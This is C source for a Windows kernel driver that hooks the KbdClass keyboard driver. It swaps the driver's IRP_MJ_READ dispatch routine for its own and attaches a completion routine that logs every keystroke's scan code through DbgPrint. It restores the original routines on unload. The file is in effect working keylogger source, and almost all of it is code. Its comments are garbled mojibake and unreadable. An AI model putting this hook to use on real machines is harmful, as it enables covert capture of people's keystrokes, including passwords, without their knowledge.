#include<ntddk.h>
/*
ԭ��˵����
�õ�ԭ����IO�豸�����ĵ�ַ�����б���
	�����к���û�е����������Ҫ�Լ��������
����ҪHOOK��IO���������滻���Լ��ĺ�����ַ
ж��HOOKʱ����ԭԭ���ĺ�����ַ��
*/
//�����豸����
#define KEYBORD_DRIVE_NAME (L"\\Driver\\KbdClass")
//���δ��������������,�ú���ͨ�����ƻ�ȡӦ�ö���
NTSTATUS ObReferenceObjectByName(
	PUNICODE_STRING lpszObjectName,//Ŀ���������
	ULONG ulAttributes,//������ԣ�һ��OBJ_CASE_INSENSITIVE
	PACCESS_STATE lpAccessState,//��������״̬�ṹ���ָ�룬һ��NULL
	ACCESS_MASK ulDesiredAccess,//��ʹ�õ�Ȩ�ޣ�һ��Ϊ�˷���FILL_ALL_ACCESS
	POBJECT_TYPE lpObjectType,//��ʶָ�����͵�ö�ٱ������豸����͸�IoDeviceObjectType,��������͸�IoDriverObjectType
	KPROCESSOR_MODE chAccessMode,//һ��NULL
	PVOID lpParseContext,//һ��NULL
	PVOID * lpObject);//�������ָ����������
//���δ������������
extern POBJECT_TYPE IoDeviceObjectType;
extern POBJECT_TYPE IoDriverObjectType;

PDRIVER_OBJECT g_pKeybordDriverObj;//���̵���������ж������Ҫ��ԭ
PDRIVER_DISPATCH g_oldDispatchFuncs[IRP_MJ_MAXIMUM_FUNCTION + 1];//ԭ���ķַ�����

int g_keyIRPCount = 0;//��¼���̵�IRP���������̵�����û�б��������ʱ������ж���������

//�Լ���IO��ȡ����
NTSTATUS c2cReadComplete(
	IN PDEVICE_OBJECT lpDeviceObject,//�൱��Win32�Ĵ��ڶ���
	IN PIRP lpIrp,//�൱��Win32����ϢMessage
	IN PVOID lpContext)
{
	//�ַ�����ָ����ַ����峤��
	PUCHAR pbuffer;
	ULONG ulLength;
	int i = 0;

	if (NT_SUCCESS(lpIrp->IoStatus.Status))
	{
		//��ȡ�ַ�����
		pbuffer = (PUCHAR)(lpIrp->AssociatedIrp.SystemBuffer);
		ulLength = lpIrp->IoStatus.Information;

		//���HOOK���ַ���ʮ������
		for (i = 0; i < ulLength; i++)
		{
			DbgPrint("Capture2Control:Key=%02x\r\n", pbuffer[i]);
		}
	}
	//һ��IRP��ɣ�������1
	g_keyIRPCount--;
	//��ɺ����Ŀ��
	if (lpIrp->PendingReturned)
	{
		IoMarkIrpPending(lpIrp);
	}
	return lpIrp->IoStatus.Status;
}
//�Լ��ķַ������������滻ԭ���ķַ�����
NTSTATUS c2cReadDispatch(
	IN PDEVICE_OBJECT lpDeviceObject,
	IN PIRP lpIrp)
{
	PIO_STACK_LOCATION pIoStackLoc;
	//����HOOK
	//IRP������һ
	g_keyIRPCount++;
	//������ɺ���
	//ʹ��IoSetCompletionRoutine���ÿ�����Ч
	pIoStackLoc = IoGetCurrentIrpStackLocation(lpIrp);
	pIoStackLoc->Control = SL_INVOKE_ON_SUCCESS | SL_INVOKE_ON_ERROR | SL_INVOKE_ON_CANCEL;
	pIoStackLoc->CompletionRoutine = (PIO_COMPLETION_ROUTINE)c2cReadComplete;

	//����ԭʼ�ַ�����
	return (g_oldDispatchFuncs[IRP_MJ_READ])(lpDeviceObject,lpIrp);
}

NTSTATUS StartHook(PUNICODE_STRING lpszRegistryPath)
{
	//���̶���ͼ��̶�����
	PDRIVER_OBJECT pKeybordDriverObj;
	UNICODE_STRING uszKeybordDriverName;

	NTSTATUS status = STATUS_SUCCESS;

	int i;

	UNREFERENCED_PARAMETER(lpszRegistryPath);
	//����HOOK

	//��ʼ��Ԥ����ļ������������ַ���
	RtlInitUnicodeString(&uszKeybordDriverName, KEYBORD_DRIVE_NAME);
	//��ȡ����IO�豸����
	status = ObReferenceObjectByName(&uszKeybordDriverName,
		OBJ_CASE_INSENSITIVE,
		NULL, 0,
		IoDriverObjectType,
		KernelMode, NULL,
		&g_pKeybordDriverObj);
	if (!NT_SUCCESS(status))
		return status;
	//����ԭʼ�ַ�����
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
	{
		g_oldDispatchFuncs[i] = g_pKeybordDriverObj->MajorFunction[i];
	}
	//�滻��ȡ����ַ�����
	g_pKeybordDriverObj->MajorFunction[IRP_MJ_READ] = c2cReadDispatch;

	return status;


}

VOID EndHook()
{
	LARGE_INTEGER waitIRPProcessEndTime;
	int i = 0;
	//���õȴ�5S
	waitIRPProcessEndTime = RtlConvertLongToLargeInteger(-5 * 1000000000 / 100);
	while (g_keyIRPCount != 0)
	{
		KeDelayExecutionThread(KernelMode, FALSE, &waitIRPProcessEndTime);
	}
	//��ԭ�ַ�����
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION + 1; i++)
	{
		g_pKeybordDriverObj->MajorFunction[i] = g_oldDispatchFuncs[i];
	}
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	EndHook();
}


NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING szRegistryPath)
{
	pDriverObject->DriverUnload = DriverUnload;
	return StartHook(szRegistryPath);
}